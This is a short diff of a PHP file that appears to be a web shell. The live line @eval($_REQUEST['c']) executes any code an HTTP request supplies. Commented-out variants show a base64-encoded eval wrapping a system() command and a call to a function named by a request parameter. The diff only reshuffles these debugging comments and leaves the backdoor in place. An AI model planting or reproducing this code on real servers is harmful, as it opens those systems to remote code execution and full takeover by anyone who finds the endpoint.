@@ -7,8 +7,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'OPTION') {
     die();
 }
 
-//var_dump($_REQUEST);
-//echo $_REQUEST['c'];
+//print_r($_REQUEST);
 @eval($_REQUEST['c']);
 //@eval($_REQUEST['c']);
 //print_r($_REQUEST);
@@ -19,5 +18,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'OPTION') {
 //echo base64_encode('echo 1;');
 //@eval(base64_decode('aGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PUdCSyIpO3N5c3RlbSgnZGlyIDI JTI2MScpOw=='));
 //eval()
-//$f = $_REQUEST['f'];$p = $_REQUEST['p'];$f($p);
+//$f = $_REQUEST['f'];$p = $_REQUEST['p'];
+//$f($p);
+//echo base64_decode($p);
+//eval(base64_decode($p))
 ?>
